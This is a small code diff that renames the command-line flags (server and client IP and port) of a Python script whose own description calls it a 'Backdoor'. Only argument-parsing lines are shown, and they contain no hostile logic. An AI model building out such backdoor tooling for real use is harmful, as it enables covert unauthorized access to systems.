@@ -5,10 +5,10 @@ from crypto import *
 
 #Argparse setup
 parser = argparse.ArgumentParser(description="Backdoor")
-parser.add_argument('-d', '--server_ip', dest='server_ip', help='Server IP', required=True)
-parser.add_argument('-p', '--server_port', dest='server_port', help='Server Port', required=True)
-parser.add_argument('-s', '--client_ip', dest='client_ip', help='Client IP', required=True)
-parser.add_argument('-sp', '--client_port', dest='client_port', help='Client Port', required= True)
+parser.add_argument('-sip', '--server_ip', dest='server_ip', help='Server IP', required=True)
+parser.add_argument('-sp', '--server_port', dest='server_port', help='Server Port', required=True)
+parser.add_argument('-cip', '--client_ip', dest='client_ip', help='Client IP', required=True)
+parser.add_argument('-cp', '--client_port', dest='client_port', help='Client Port', required= True)
 args = parser.parse_args()
 
 
